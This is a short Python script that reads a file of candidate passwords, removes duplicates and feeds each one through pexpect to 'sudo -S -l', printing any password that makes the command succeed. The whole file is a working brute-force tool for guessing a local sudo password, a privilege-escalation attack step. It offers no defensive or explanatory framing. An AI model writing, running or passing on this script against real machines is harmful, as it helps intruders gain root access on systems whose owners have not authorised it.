

# Load pwds from a file(s) passed as argument
# find only unique pwds
# use pexpect library to test each pwd against a command
# print the result code of the command

import argparse
import os
import pexpect
import sys
import time

# parse arguments
parser = argparse.ArgumentParser(description='Test passwords against a command.')
parser.add_argument('file', help='The file containing the passwords to test.')
parser.add_argument('-t', '--timeout', help='The timeout for the command.', type=int, default=10)
parser.add_argument('-v', '--verbose', help='Verbose output.', action='store_true')
args = parser.parse_args()

command = "sudo -S -l"

# check if the file exists
if not os.path.isfile(args.file):
    print(f"File {args.file} does not exist.")
    sys.exit(1)

# read all pwds from the file and append them to a list
pwds = []
with open(args.file, 'r') as f:
    pwds += f.read().splitlines()

# convert the list to a set to remove duplicates
pwds = set(pwds)

print(f"Passwords loaded: {len(pwds):,}")

# create a list with the results
results = []

# test each pwd against the command
for pwd in pwds:
    if args.verbose:
        print(f"Testing {pwd}...")
    child = pexpect.spawn(command, timeout=args.timeout)
    child.expect('Password:')
    child.sendline(pwd+'\n')
    child.expect(pexpect.EOF)
    if child.exitstatus == 0:
        results.append(pwd)
        print(f"Password found: {pwd}")
    else:
        print(f"Password not found: {pwd}")
    child.close()




